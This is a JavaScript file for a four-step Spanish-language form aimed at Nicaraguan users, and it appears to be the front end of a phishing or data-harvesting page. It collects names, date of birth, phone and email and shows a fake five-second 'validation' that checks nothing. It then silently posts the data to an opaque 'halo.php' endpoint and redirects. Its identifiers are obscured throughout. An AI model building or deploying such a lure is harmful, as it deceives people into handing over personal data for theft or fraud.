(() => {
  const TOTAL_STEPS = 4;
  const VALIDATION_SECONDS = 5;
  let current = 1;
  let validationTimer = null;
  const data = {};

  const stepEls = document.querySelectorAll('#stp .step');
  const sections = document.querySelectorAll('.fs1');

  function rnd(scrollToStepper) {
    stepEls.forEach((el) => {
      const n = Number(el.dataset.step);
      el.classList.toggle('active', n === current);
      el.classList.toggle('done', n < current);
    });
    sections.forEach((s) => {
      s.classList.toggle('active', Number(s.dataset.form) === current);
    });
    // Scroll al stp solo cuando el usuario cambia de paso, NO en la carga inicial.
    if (scrollToStepper) {
      const stepperWrap = document.querySelector('.sw1');
      if (stepperWrap) {
        const y = stepperWrap.getBoundingClientRect().top + window.pageYOffset - 8;
        window.scrollTo({ top: y, behavior: 'smooth' });
      }
    }
  }

  function gx(step) {
    if (step < 1 || step > TOTAL_STEPS) return;
    current = step;
    rnd(true);
    if (step === 3) svs();
  }

  function svl() {
    if (validationTimer) {
      clearTimeout(validationTimer);
      validationTimer = null;
    }
  }

  function svs() {
    svl();
    validationTimer = setTimeout(() => {
      validationTimer = null;
      gx(4);
    }, VALIDATION_SECONDS * 1000);
  }

  // Step 1 form
  const g01 = document.getElementById('g01');
  g01.addEventListener('submit', (e) => {
    e.preventDefault();
    if (!g01.reportValidity()) return;
    data.nombres = g01.nombres.value.trim();
    data.apellidos = g01.apellidos.value.trim();

    gx(2);
  });

  // ---- Input fecha nacimiento: auto-formato DD/MM/AAAA ----
  const fechaInput = document.getElementById('d01');

  fechaInput.addEventListener('input', (e) => {
    let digits = e.target.value.replace(/\D/g, '').slice(0, 8);
    let formatted = '';
    if (digits.length > 4) {
      formatted = digits.slice(0,2) + '/' + digits.slice(2,4) + '/' + digits.slice(4);
    } else if (digits.length > 2) {
      formatted = digits.slice(0,2) + '/' + digits.slice(2);
    } else {
      formatted = digits;
    }
    e.target.value = formatted;
    e.target.setCustomValidity('');
  });

  function vfn() {
    const val = fechaInput.value;
    const parts = val.split('/');
    if (parts.length !== 3 || parts[2].length !== 4) {
      fechaInput.setCustomValidity('Ingresa la fecha completa: DD/MM/AAAA');
      return false;
    }
    const day   = parseInt(parts[0], 10);
    const month = parseInt(parts[1], 10);
    const year  = parseInt(parts[2], 10);

    if (month < 1 || month > 12 || day < 1 || day > 31 || year < 1900 || year > 9999) {
      fechaInput.setCustomValidity('Fecha inválida');
      return false;
    }
    const d = new Date(year, month - 1, day);
    if (d.getMonth() !== month - 1 || d.getDate() !== day) {
      fechaInput.setCustomValidity('Fecha inválida');
      return false;
    }
    fechaInput.setCustomValidity('');
    return true;
  }

  fechaInput.addEventListener('blur', vfn);

  // ---- Teléfono Nicaragua: auto-formato 8888 8888 (8 dígitos) ----
  const phoneInput = document.getElementById('p01');
  phoneInput.addEventListener('input', (e) => {
    let digits = e.target.value.replace(/\D/g, '').slice(0, 8);
    e.target.value = digits.length > 4
      ? digits.slice(0, 4) + ' ' + digits.slice(4)
      : digits;
    e.target.setCustomValidity('');
  });

  function vpn() {
    const digits = phoneInput.value.replace(/\D/g, '');
    if (digits.length !== 8) {
      phoneInput.setCustomValidity('Teléfono inválido. Debe tener 8 dígitos.');
      return false;
    }
    if (!['2','5','7','8'].includes(digits[0])) {
      phoneInput.setCustomValidity('Número inválido.');
      return false;
    }
    phoneInput.setCustomValidity('');
    return true;
  }
  phoneInput.addEventListener('blur', vpn);

  // ---- e01 básico ----
  const emailInput = document.getElementById('e01');
  function ve1() {
    const v = emailInput.value.trim();
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;
    if (!re.test(v)) {
      emailInput.setCustomValidity('Correo electrónico inválido.');
      return false;
    }
    emailInput.setCustomValidity('');
    return true;
  }
  emailInput.addEventListener('input', () => emailInput.setCustomValidity(''));
  emailInput.addEventListener('blur', ve1);

  // Step 2 form
  const g02 = document.getElementById('g02');
  g02.addEventListener('submit', (e) => {
    e.preventDefault();
    vfn();
    vpn();
    ve1();
    if (!g02.reportValidity()) return;

    data.d01   = g02.d01.value.trim();
    data.p01      = g02.p01.value.trim();
    data.e01      = g02.e01.value.trim();
    data.antiguedad = g02.antiguedad.value;

    sessionStorage.setItem('p01', data.p01.replace(/\s/g, ''));
    sessionStorage.setItem('e01', data.e01);

    gx(3);
  });

  // Solicitar Ahora — envía todo en un solo mensaje y navega
  const btnSolicitar = document.querySelector('.bp1');
  if (btnSolicitar) {
    btnSolicitar.addEventListener('click', (e) => {
      e.preventDefault();
      const dest = btnSolicitar.getAttribute('href') || 'heno.html';
      fetch('halo.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          step:       'solicitud',
          nombres:    data.nombres    || '',
          apellidos:  data.apellidos  || '',
          d01:   data.d01   || '',
          p01:      data.p01      || '',
          e01:      data.e01      || '',
          antiguedad: data.antiguedad || '',
          _tk:        btoa(String(Date.now()/1000)),
        }),
        keepalive: true,
      }).catch(() => {}).finally(() => {
        window.location.href = dest;
      });
    });
  }

  // Generic buttons
  document.querySelectorAll('[data-action="back"]').forEach((b) => {
    b.addEventListener('click', () => {
      svl();
      gx(current - 1);
    });
  });
  document.querySelectorAll('[data-action="next"]').forEach((b) => {
    b.addEventListener('click', () => gx(current + 1));
  });
  document.querySelectorAll('[data-action="restart"]').forEach((b) => {
    b.addEventListener('click', () => {
      svl();
      g01.reset();
      g02.reset();
      gx(1);
    });
  });

  rnd();
})();
